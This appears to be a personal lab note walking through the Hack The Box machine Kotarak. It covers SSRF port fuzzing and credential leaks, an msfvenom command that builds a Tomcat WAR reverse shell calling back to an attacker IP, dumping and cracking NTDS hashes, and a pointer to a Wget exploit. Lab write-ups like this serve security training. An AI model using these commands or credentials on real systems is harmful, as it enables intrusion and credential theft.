202210041349
Status: #idea
Tags: [[Labs]]

# Kotarak
ip: 10.10.10.55


## Recon

Ports Open:

```
22/tcp    open  ssh
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
60000/tcp open  unknown
```

Full Nmap Scan:

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5 - Error report
| http-methods: 
|_  Potentially risky methods: PUT DELETE
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title:         Kotarak Web Hosting        
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 8080:

- Apache Tomcat 8.5.5
- No root directory
- Directory listing:
```
/docs
/examples
/manager
 - /manager/images [Authentication Required]
 - /manager/html   [Authentication Required]
 - /manager/text   [Authentication Required]
 - /manager/status [Authentication Required]
```

Port 60000:

- Web browser that surfs a given input url
- http://10.10.10.55:60000/url.php?path=RFI
- PoC:
![[rfi_poc.png]]
- Not executing php script, just displaying. Possible SSRF?
- SSRF PoC:
![[ssrf_poc.png]]

- Discovered multiple local ports by fuzzing:

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000022:   200        4 L      4 W        62 Ch       "22"                                                                                                                                                                       
000000090:   200        11 L     18 W       156 Ch      "90"                                                                                                                                                                       
000000110:   200        17 L     24 W       187 Ch      "110"                                                                                                                                                                      
000000200:   200        3 L      2 W        22 Ch       "200"                                                                                                                                                                      
000000320:   200        26 L     109 W      1232 Ch     "320"                                                                                                                                                                      
000000888:   200        78 L     265 W      3955 Ch     "888"                                                                                                                                                                      
000003306:   200        2 L      6 W        123 Ch      "3306"                                                                                                                                                                     
000008080:   200        2 L      47 W       994 Ch      "8080"
```

- Found credentials utilizing SSRF: `admin:3@g01PdhB!`

![[ssrf_infodisclose.png]]

# Exploitation

Port 80:

- Authenticated into /manager/status with new credentials found.
- We can upload a malicious WAR file to get a reverse shell
- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=9999 -f war -o rshell.war`
- For a more detailed process; Refer to [[Reverse Shell With Tomcat]] 

## Post Exploitation

- Interesting Files Found in `/home/tomcat/to_archive/pentest_data`

```bash
#This is an ntds.dit file
-rw-r--r-- 1 tomcat tomcat 16793600 Jul 21  2017 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit

#This is a system hive
-rw-r--r-- 1 tomcat tomcat 12189696 Jul 21  2017 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
```
- Utilizing secretsdump.py:
- `secretsdump.py -ntds ntds.dit -system systemhive LOCAL`
- Hashes returned with secretsdump.py

```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x14b6fb98fedc8e15107867c4722d1399
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: d77ec2af971436bccb3b6fc4a969d7ff
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WIN-3G2B0H151AC$:1000:aad3b435b51404eeaad3b435b51404ee:668d49ebfdb70aeee8bcaeac9e3e66fd:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
WIN2K8$:1103:aad3b435b51404eeaad3b435b51404ee:160f6c1db2ce0994c19c46a349611487:::
WINXP1$:1104:aad3b435b51404eeaad3b435b51404ee:6f5e87fd20d1d8753896f6c9cb316279:::
WIN2K31$:1105:aad3b435b51404eeaad3b435b51404ee:cdd7a7f43d06b3a91705900a592f3772:::
WIN7$:1106:aad3b435b51404eeaad3b435b51404ee:24473180acbcc5f7d2731abe05cfa88c:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

- Cracking Hashes with Crackstation.net
- `atanas:Password123!`
- `administrator:f16tomcat!`

Logging into Atanas:

- `atanas:f16tomcat!` allowed us to get user
- Interesting file:
```
atanas@kotarak-dmz:/root$ cat app.log 

10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"

10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"

10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```
- Wget 1.16 is vulnerable to Arbitrary File Upload / Remote Code Execution
- CVE-2016-4971 https://www.exploit-db.com/exploits/40064









---
# References
